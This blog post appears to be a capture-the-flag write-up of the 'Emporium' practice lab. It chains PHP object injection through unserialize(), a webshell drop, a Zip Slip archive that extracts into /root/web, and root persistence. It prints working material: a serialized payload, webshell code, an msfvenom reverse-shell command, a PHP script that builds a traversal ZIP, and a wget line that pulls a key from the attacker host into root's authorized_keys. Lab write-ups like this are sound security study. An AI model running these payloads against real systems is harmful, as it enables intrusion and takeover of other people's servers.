---
layout: post
title: PG-Practice Emporium
---
PG-Practice Emporium [PHP Object Injection vulnerability due to unsafe deserialization + Zip Slip]

## Target Overview
- Machine Name: Emporium
- Operating System: Linux
- IP Address -

## Exploit Chain

| Phase                    | Action                                      | Details                                                              |
| ------------------------ | ------------------------------------------- | -------------------------------------------------------------------- |
| Enumeration              | Manual browsing & `ffuf` discovery          | Found `/backup.zip` containing source code                           |
| **Execution**            | PHP Object Deserialization<br>              | Exploited insecure `unserialize()` with custom class `AddSubscriber` |
| **Initial Access**       | Arbitrary file write via `__destruct()`     | Dropped `shell.php` inside webroot to gain RCE                       |
| **Privilege Escalation** | Discovered internal service running as root | Enumerated `/root/web` via pspy64 and abused ZIP extraction logic    |
| **Impact**               | Full system compromise                      | Read `/root/root.txt`, dumped system-level data                      |


## Reconaissance
`nmap -p- -sV -sC <>`
![](/assets/images/emporium/re1.png)

## Enumeration

![](/assets/images/emporium/enum1.png)

The site appeared static, and no additional pages or endpoints were discovered during manual browsing and source inspection other than `/index.php?email=` indicating backend logic that responds to user input.

![](/assets/images/emporium/enum2.png)

**Tech Stack**

The web server was fingerprinted using tool `whatweb`, revealing the following technologies:

| Component    | Version |
| ------------ | ------- |
| Apache HTTPD | 2.4.52  |
| jQuery       | 1.10.2  |
| HTML5        | —       |
| Bootstrap    | —       |
| JavaScript   | —       |

**Directory BruteForcing**

Directory brute-forcing revealed an archive named `backup.zip`, which appeared to contain the application’s source code files.

![](/assets/images/emporium/enum3.png)


![](/assets/images/emporium/enum4.png)
## Vulnerability analysis


![](/assets/images/emporium/va1.png)

Source code analysis revealed a hidden functionality triggered by the `debug` parameter. When `debug=true` , the application expects a `message` parameter which is directly passed to PHP’s `unserialize()` function without any sanitization.

The presence of a user-defined class `AddSubscriber` makes the application vulnerable to PHP object injection vulnerability. By crafting a malicious serialized payload that overrides the `$sub_file` property, it is possible to write arbitrary content to a file within the web directory — bypassing the intended `../subscribers.txt` path.

When the serialized object is passed to `unserialize()`, PHP recreates it and fills in the property values directly, ignoring any constructor logic. This allows an attacker to craft a payload that sets `$sub_file` to a path like `shell.php` and `$info`to a PHP webshell. When the object is later destroyed, the `__destruct()` method runs and writes the shell to that file — leading to code execution.

**Constructing the Payload**

```
O:13:"AddSubscriber":2:{s:8:"sub_file";s:9:"shell.php";s:4:"info";s:28:"<?php system($_GET['cmd']); ?>"}
```
- `O:13` indicates an object of a class with length 13 `AddSubscriber`
- `s:8` and `s:4` refer to property names of the class `sub_file` and `info`
- The `sub_file` was set to `shell.php` to drop the shell
- The `info` property was populated to inject arbitrary code to achieve execution

![](/assets/images/emporium/va2.png)

## Exploitation
![](/assets/images/emporium/exp1.png)

**Initial Foothold**

![](/assets/images/emporium/exp2.png)

I used msfvenom to generate a Linux ELF binary that establishes a reverse shell connection back to my machine. After uploading i used the webshell to grant execute permission.
` msfvenom -p linux/x64/shell/reverse_tcp LHOST=<> LPORT=80 -f elf -o bp`

`curl http://192.168.179.223/shell.php?cmd=chmod+777+bp`

![](/assets/images/emporium/exp3.png)
![](/assets/images/emporium/exp4.png)

The ELF binary generated by `msfvenom` was unstable and frequently crashed. As a fallback, I switched to a classic PHP reverse shell for more reliable access. 

Staring a python server 
![](/assets/images/emporium/exp5.png)
The PHP reverse shell was invoked by sending an HTTP request with *curl*

`curl 'http://192.168.179.223/rev.php'`

![](/assets/images/emporium/exp6.png)
**local.txt**

![](/assets/images/emporium/exp7.png)

## Privilege Escalation
Running Linpeas.sh _[a script that checks for privilege escalation vectors]_ indicated the presence of a web applicaiton hosted internally on port 8080

Escalating
![](/assets/images/emporium/pe1.png)
Execution of pspy64 tool, used to  observe system-level process activity. It allows enumeration of all running processes regardless of privilege
![](/assets/images/emporium/pe2.png)
The application runs with uid=0, confirming it operates under root privileges. The web root is located in /root/web

To get acces to the internal network used to chisel binary to get a reverse port forward 

![](/assets/images/emporium/pe3.png)
![](/assets/images/emporium/pe4.png)

Accessing the page
![](/assets/images/emporium/pe5.png)
source code review indicates, client side validation
![](/assets/images/emporium/pe6.png)


I used the `/usr/share/webshell/php/simple-backdoor.php` as a file to upload by bypassing the client side validation with alterning the filename, the web appliaction was indicating the file uploaded,
```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
	}
?>
```

![](/assets/images/emporium/pe7.png)
The uploaded file was not able to access in the expected directory, indicating, it might have stored somewhere else

![](/assets/images/emporium/pe9.png)

It was observed that each uploaded archive resulted in a new folder being created inside `/uploads/`. Only `.zip` files were fully extracted, indicating the presence of a archive handling logic.
`/uploads/$RANDOM_NUMBER/<contents>`


Further researching, I discovered that certain PHP versions were vulnerable to unsafe ZIP extraction behavior — specifically, allowing files inside an archive to be written to arbitrary paths when extracted

- `https://vulert.com/vuln-db/CVE-2021-21706`
- `https://bugs.php.net/bug.php?id=70019`

Attempted to create files with path traversal techniques (e.g., using `touch`), but file creation failed due to restricted paths or invalid filenames.
I crafted the following script to generate a malicious ZIP file

```php
<?php
$zipName = "shell";
$fileName = "rev.php";
$fileContent = '';
$zipInternalPath = "../../../../../root/web/" . $fileName;
file_put_contents($fileName, $fileContent);
$zip = new ZipArchive();
if ($zip->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
    die("Could not create zip archive\n");
}
$zip->addFile($fileName, $zipInternalPath);
$zip->close();
unlink($fileName);
echo "ZIP file '$zipName' created with '$zipInternalPath' inside.\n";
?>
```
The server processed the uploaded ZIP archive and created a folder under the `/uploads/` path. However, due to directory traversal in the file path, one file was extracted into `/root/web/`, which led to remote code execution when accessed.
![](/assets/images/emporium/pe8.png)
## Post-Access


![](/assets/images/emporium/pa1.png)

`http://127.0.0.1:8080/shell.php?cmd=wget+http://192.168.45.205/key.pub+-O+/root/.ssh/authorized_keys`


![](/assets/images/emporium/pa2.png)


## Recommendations

- Never run web services with root privileges — use a dedicated low-privilege user.
- Avoid deserializing user input via functions like unserialize() without strict validation.
- Use a sandboxed or temporary directory for handling uploaded files.
- Regularly update software packages (e.g., PHP) to patch known vulnerabilities.
- Remove backup files (.zip, .bak) from publicly accessible directories.

